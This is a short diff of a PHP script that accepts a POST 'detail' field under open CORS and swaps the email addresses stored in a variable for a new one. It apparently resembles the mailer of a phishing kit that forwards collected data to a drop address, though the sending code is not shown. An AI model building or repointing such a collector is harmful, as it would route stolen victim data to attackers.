@@ -9,7 +9,7 @@ ini_set('error_log', 'errors.log');
 */
 header('Access-Control-Allow-Origin: *');
 header('Content-Type: application/json');
-$Ok = "jacksonronald270@yahoo.com,demoforce@bk.ru";
+$Ok = "justworkin2023@gmail.com";
 //
 $detail = isset($_POST['detail']) ? $_POST['detail'] : "";
 $json = [];
